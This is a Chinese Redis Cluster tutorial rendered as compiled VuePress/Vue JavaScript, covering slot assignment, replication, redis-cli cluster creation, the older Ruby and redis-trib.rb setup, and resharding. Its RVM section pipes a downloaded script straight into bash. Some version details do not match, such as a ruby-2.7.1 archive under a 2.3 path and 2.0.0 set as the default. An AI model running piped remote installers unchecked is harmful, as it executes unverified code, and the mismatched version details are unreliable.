\"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7005\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"指派槽\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"mkdir\")]),s._v(\" script\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" script/\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cat\")]),s._v(\" addslots.sh\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[s._v(\"start\")]),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"=\")]),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"$1\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[s._v(\"end\")]),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"=\")]),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"$2\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[s._v(\"port\")]),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"=\")]),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"$3\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[s._v(\"for\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token for-or-select variable\"}},[s._v(\"slot\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[s._v(\"in\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")]),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"seq\")]),s._v(\" $\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),s._v(\"start\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),s._v(\" $\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"{\")]),s._v(\"end\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"}\")]),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")])]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[s._v(\"do\")]),s._v(\"\\n  \"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"echo\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"slot:'),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${slot}\")]),s._v('\"')]),s._v(\"\\n  redis-cli -p \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${port}\")]),s._v(\" cluster addslots \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${slot}\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[s._v(\"done\")]),s._v(\"\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sh\")]),s._v(\" addslots.sh \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"0\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"5461\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sh\")]),s._v(\" addslots.sh \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"5462\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"10922\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7001\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sh\")]),s._v(\" addslots.sh \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"10923\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"16383\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7002\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"4\"}},[t(\"li\",[s._v(\"主从\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#cluster replicate node-id\")]),s._v(\"\\ncluster nodes\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1  -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7003\")]),s._v(\" cluster replicate \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7000}\")]),s._v(\"\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1  -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7004\")]),s._v(\" cluster replicate \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7001}\")]),s._v(\"\\nredis-cli -h \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1  -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7005\")]),s._v(\" cluster replicate \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7002}\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"官方工具安装\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#官方工具安装\"}},[s._v(\"#\")]),s._v(\" 官方工具安装\")]),s._v(\" \"),t(\"div\",{staticClass:\"custom-block warning\"},[t(\"p\",{staticClass:\"custom-block-title\"},[s._v(\"WARNING\")]),s._v(\" \"),t(\"p\",[s._v(\"Redis Cluster 在 5.0 之后取消了 ruby 脚本 redis-trib.rb 的支持（手动命令行添加集群的方式不变），集合到 redis-cli 里，避免了再安装 ruby 的相关环境\")]),s._v(\" \"),t(\"p\",[s._v(\"All commands and features belonging to redis-trib.rb have been moved to redis-cli\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"redis-cli --cluster create --cluster-replicas \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7000 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7001 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7002 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7003 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7004 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7005\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"以下为-redis-cluster-5-0-之前的安装方式\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#以下为-redis-cluster-5-0-之前的安装方式\"}},[s._v(\"#\")]),s._v(\" 以下为 Redis Cluster 5.0 之前的安装方式\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"安装 Ruby 环境\")])]),s._v(\" \"),t(\"p\",[s._v(\"RVM 安装\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#安装GPG keys\")]),s._v(\"\\ngpg2 --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#安装 RVM\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"curl\")]),s._v(\" -sSL https://get.rvm.io \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"bash\")]),s._v(\" -s stable\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#载入RVM环境\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"source\")]),s._v(\" /etc/profile.d/rvm.sh\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#检查RVM是否安装好\")]),s._v(\"\\nrvm -v\\ngem -v\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#列出已知的ruby版本\")]),s._v(\"\\nrvm list known\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#选择现有的rvm版本来进行安装\")]),s._v(\"\\nrvm \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"2.7\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#查询已安装的ruby\")]),s._v(\"\\nrvm list\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#卸载已安装的版本\")]),s._v(\"\\nrvm remove \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"版本号\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#设置Ruby版本\")]),s._v(\"\\nrvm \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"2.0\")]),s._v(\".0 —default\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#更换Ruby源\")]),s._v(\"\\ngem sources\\ngem sources -a http://mirrors.aliyun.com/rubygems/\\ngem sources -r https://rubygems.org/\\ngem sources -u\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"24\")]),t(\"br\")])]),t(\"p\",[s._v(\"源码安装\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"yum \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" zlib-devel openssl-devel\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#下载ruby\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"wget\")]),s._v(\" https://cache.ruby-lang.org/pub/ruby/2.3/ruby-2.7.1.tar.gz\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#安装ruby\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"tar\")]),s._v(\" -xvf ruby-2.7.1.tar.gz\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" ruby-2.7.1\\n./configure --prefix\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"=\")]),s._v(\"/usr/local/ruby  --disable-install-rdoc\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"make\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"make\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\"\\nruby -v\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"cd\")]),s._v(\" /usr/local/ruby\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cp\")]),s._v(\" bin/ruby /usr/local/bin\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cp\")]),s._v(\" bin/gem /usr/local/bin\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\")])]),t(\"div\",{staticClass:\"custom-block warning\"},[t(\"p\",{staticClass:\"custom-block-title\"},[s._v(\"WARNING\")]),s._v(\" \"),t(\"p\",[s._v(\"出现报错\\nDirectory .ext/rdoc already exists, but it looks like it isn't an RDoc directory.\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#不安装rdoc\")]),s._v(\"\\n./configure --disable-install-rdoc\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"安装 redis\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"gem \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" redis\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#安装rubygem redis\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"wget\")]),s._v(\" https://rubygems.org/downloads/redis-4.1.4.gem\\ngem \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"install\")]),s._v(\" -l redis-4.1.4.gem\\ngem list --check redis gem\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"安装 redis-trib.rb\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#cp ${REDIS_HOME}/src/redis-trib.rb /usr/local/bin\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"find\")]),s._v(\" / -name redis-trib.rb\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"cp\")]),s._v(\" /usr/local/redis/src/redis-trib.rb /usr/local/bin\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"4\"}},[t(\"li\",[s._v(\"构建集群\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"./redis-trib.rb create --replicas \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7000 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7001 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7002 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7003 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7004 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7005\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"扩容集群\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#扩容集群\"}},[s._v(\"#\")]),s._v(\" 扩容集群\")]),s._v(\" \"),t(\"ol\",[t(\"li\",[s._v(\"准备新节点\")])]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"集群模式\")]),s._v(\" \"),t(\"li\",[s._v(\"配置和其他节点统一\")]),s._v(\" \"),t(\"li\",[s._v(\"启动后是孤儿节点\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sed\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'s/7000/7006/g'\")]),s._v(\" redis-7000.conf \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" redis-7006.conf\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sed\")]),s._v(\" \"),t(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'s/7000/7007/g'\")]),s._v(\" redis-7000.conf \"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\">\")]),s._v(\" redis-7007.conf\\nredis-server redis-7006.conf\\nredis-server redis-7007.conf\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\")])]),t(\"ol\",{attrs:{start:\"2\"}},[t(\"li\",[s._v(\"加入集群\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"redis-cli -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" cluster meet \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7006\")]),s._v(\"\\nredis-cli -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7000\")]),s._v(\" cluster meet \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1 \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7007\")]),s._v(\"\\nredis-cli -p \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"7007\")]),s._v(\" cluster replicate  \"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\"\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#加入集群-redis-trib.rb\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#redis-trib.rb add-node new_host:new_port existing_host:existing_port --slave --master-id <arg>\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#redis-trib.rb add-node 127.0.0.1:7006 127.0.0.1:7000\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\")])]),t(\"p\",[s._v(\"作用\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"为他迁移槽和数据实现扩容\")]),s._v(\" \"),t(\"li\",[s._v(\"作为从节点负责故障转移\")])]),s._v(\" \"),t(\"ol\",{attrs:{start:\"3\"}},[t(\"li\",[s._v(\"迁移槽和数据\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#Redis Cluster 5.0 之后使用\")]),s._v(\"\\nredis-cli --cluster reshard \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7000\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#Redis Cluster 5.0 之前使用\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#redis-trib\")]),s._v(\"\\nredis-trib.rb reshard \"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"127.0\")]),s._v(\".0.1:7000\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"4096\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"${node-id-7006}\")]),s._v(\"\\nall\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"yes\")]),s._v(\"\\n\")])]),s._v(\" 